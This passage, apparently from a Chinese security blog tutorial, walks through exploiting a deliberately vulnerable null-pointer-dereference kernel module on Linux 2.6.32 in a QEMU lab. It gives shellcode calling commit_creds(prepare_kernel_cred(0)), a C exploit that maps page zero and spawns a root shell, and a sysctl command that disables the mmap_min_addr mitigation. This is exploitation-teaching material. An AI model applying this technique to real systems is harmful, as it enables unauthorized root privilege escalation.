<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -static poc.c -o poc</span><br></pre></td></tr></table></figure>
<p>一定要静态链接，因为进busybox链接库那些是没有的。将编译出的poc也放到busybox的usr目录中。<br>这里要注意，每次拷贝新文件到busybox的文件系统中去，都要在_install目录中执行：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
<p>重新生成rootfs.img文件。<br>qemu启动Linux内核，启动后用Ctrl+Alt+2到控制台，输入：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) gdbserver tcp::1234</span><br></pre></td></tr></table></figure>
<p><img src="/images/linuxkernel/qemuconsole.png"><br>在本地linux-2.6.32目录中用gdb去连接：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">(gdb) target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">default_idle() at arch&#x2F;x86&#x2F;kernel&#x2F;process.c:311</span><br><span class="line">311            current_thread_info()-&gt;status |&#x3D; TS_POLLING;</span><br><span class="line">(gdb) b *0x0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing</span><br></pre></td></tr></table></figure>
<p>在qemu中Ctrl+Alt+1切换回命令行，进入usr目录，挂载驱动后运行poc程序。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr # insmod null_dereference.ko</span><br><span class="line">...</span><br><span class="line">&#x2F;usr # .&#x2F;poc</span><br></pre></td></tr></table></figure>
<p>这时gdb就会命中断点，因为调用了空的函数指针，所以会跳转到0x0。反汇编查看当前执行的指令：<br><img src="/images/linuxkernel/gdbremote.png"><br>可以看到如果继续执行就会执行我们的payload。<br><strong>exploit</strong><br>1.思路：给当前进程赋予root权限  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
<p>在qemu中获取commit_creds和prepare_kernel_cred地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # grep commit_creds &#x2F;proc&#x2F;kallsyms</span><br><span class="line">c1056f80 T commit_creds</span><br><span class="line">c11a6b60 T security_commit_creds</span><br><span class="line">&#x2F; # grep prepare_kernel_cred &#x2F;proc&#x2F;kallsyms</span><br><span class="line">c1057120 T prepare_kernel_cred</span><br></pre></td></tr></table></figure>
<p>2.编写shellcode  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor %eax, %eax</span><br><span class="line">call 0xc1057120</span><br><span class="line">call 0xc1056f80</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>编译shellcode，并获取其机器码：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o payload payload.s -nostdlib -Ttext&#x3D;0</span><br><span class="line">$ objdump -d payload</span><br><span class="line"></span><br><span class="line">payload:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:    31 c0                    xor    %eax,%eax</span><br><span class="line">   2:    e8 19 71 05 c1           call   c1057120 &lt;_end+0xc1056110&gt;</span><br><span class="line">   7:    e8 74 6f 05 c1           call   c1056f80 &lt;_end+0xc1055f70&gt;</span><br><span class="line">   c:    c3                       ret</span><br></pre></td></tr></table></figure>
<p>得到shellcode：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;\x31\xc0\xe8\x19\x71\x05\xc1\xe8\x74\x6f\x05\xc1\xc3&quot;</span></span><br></pre></td></tr></table></figure>
<p>现在将shellcode放入分配的0x0地址空间，当调用空函数指针时，使当前进程有root权限，然后执行一个system(“/bin/sh”);在程序返回用户态之后获得root shell。<br><strong>exploit</strong>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">&quot;\x31\xc0\xe8\x19\x71\x05\xc1\xe8\x74\x6f\x05\xc1\xc3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">    write(fd, <span class="string">&quot;fanrong&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); <span class="comment">// get root shell</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译exploit：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -static exploit.c -o exploit</span><br></pre></td></tr></table></figure>
<p>将exploit放到busybox的usr目录中，在busybox的etc目录中新建passwd文件和group文件，在根目录新建/home/fanrong<br>新建用户测试Exploit：<br><img src="/images/linuxkernel/segmentfault.png"><br>这里会报错，因为2.6.32内核已经使用mmap_min_addr作为缓解措施，mmap_min_addr为4096，需要设置一下mmap_min_addr：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sysctl -w vm.mmap_min_addr&#x3D;&quot;0&quot;</span><br></pre></td></tr></table></figure>
<p>再次运行exploit：<br><img src="/images/linuxkernel/rootshell.png"><br>成功拿到root shell！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3702.html">http://bobao.360.cn/learning/detail/3702.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
